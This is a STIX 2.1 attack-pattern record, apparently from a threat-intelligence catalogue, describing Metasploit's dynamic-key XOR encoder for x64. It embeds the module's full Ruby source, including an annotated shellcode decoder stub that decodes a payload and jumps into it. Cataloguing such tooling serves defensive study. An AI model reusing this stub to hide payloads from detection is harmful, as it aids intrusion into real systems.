{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e1f9053d-ea85-421a-b36b-95303ce0c708",
    "created": "2024-08-14T16:33:19.242848Z",
    "modified": "2024-08-14T16:33:19.242852Z",
    "name": "Dynamic key XOR Encoder",
    "description": "An x64 XOR encoder with dynamic key size",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/x64/xor_dynamic.rb",
            "external_id": "xor_dynamic.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Encoder::XorDynamic\n\n  def initialize\n    super(\n      'Name'             => 'Dynamic key XOR Encoder',\n      'Description'      => 'An x64 XOR encoder with dynamic key size',\n      'Author'           => [ 'lupman', 'phra' ],\n      'Arch'             => ARCH_X64,\n      'License'          => MSF_LICENSE\n      )\n  end\n\n  # Indicate that this module can preserve some registers\n  # ...which is currently not true. This is a temp fix\n  # until the full preserve_registers functionality is\n  # implemented.\n  def can_preserve_registers?\n    true\n  end\n\n  def stub\n    \"\\xeb\\x27\" +             #        jmp    _call\n    \"\\x5b\" +                 # _ret:  pop    rbx\n    \"\\x53\" +                 #        push   rbx\n    \"\\x5f\" +                 #        pop    rdi\n    \"\\xb0\\x41\" +             #        mov    al, 'A'\n    \"\\xfc\" +                 #        cld\n    \"\\xae\" +                 # _lp1:  scas   al, BYTE PTR es:[rdi]\n    \"\\x75\\xfd\" +             #        jne    _lp1\n    \"\\x57\" +                 #        push   rdi\n    \"\\x59\" +                 #        pop    rcx\n    \"\\x53\" +                 # _lp2:  push   rbx\n    \"\\x5e\" +                 #        pop    rsi\n    \"\\x8a\\x06\" +             # _lp3:  mov    al, BYTE PTR [rsi]\n    \"\\x30\\x07\" +             #        xor    BYTE PTR [rdi], al\n    \"\\x48\\xff\\xc7\" +         #        inc    rdi\n    \"\\x48\\xff\\xc6\" +         #        inc    rsi\n    \"\\x66\\x81\\x3f\\x42\\x42\" + #        cmp    WORD PTR [rdi], 'BB'\n    \"\\x74\\x07\" +             #        je     _jmp\n    \"\\x80\\x3e\\x41\" +         #        cmp    BYTE PTR [rsi], 'A'\n    \"\\x75\\xea\" +             #        jne    _lp3\n    \"\\xeb\\xe6\" +             #        jmp    _lp2\n    \"\\xff\\xe1\" +             # _jmp:  jmp    rcx\n    \"\\xe8\\xd4\\xff\\xff\\xff\"   # _call: call   _ret\n  end\n\n  def stub_key_term\n    /A/\n  end\n\n  def stub_payload_term\n    /BB/\n  end\nend\n"
}